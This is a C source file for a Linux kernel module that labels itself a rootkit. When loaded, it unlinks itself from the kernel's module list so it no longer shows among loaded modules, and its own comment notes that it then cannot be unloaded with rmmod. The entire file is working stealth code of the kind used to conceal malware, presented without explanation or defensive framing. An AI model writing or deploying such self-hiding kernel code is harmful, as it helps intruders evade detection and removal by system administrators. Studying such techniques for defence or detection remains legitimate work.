#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/version.h>


MODULE_LICENSE("GPL");
MODULE_VERSION("1.0");

static struct list_head *prev_module;
static short hidden = 0;

void showme(void) {
    printk(KERN_INFO "showing rootkit\n");
    list_add(&THIS_MODULE->list, prev_module);
    hidden = 0;
}

void hideme(void) {
    printk(KERN_INFO "hiding rootkit\n");
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    hidden = 1;
}

static int __init rootkit_init(void) {
    printk(KERN_INFO "rootkit Loaded\n");
    hideme();
    showme();
    hideme();
    return 0;
}

static void __exit rootkit_exit(void) {
    // when module is hidden, won't exit - rmmod will fail
    printk(KERN_INFO "rootkit Unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
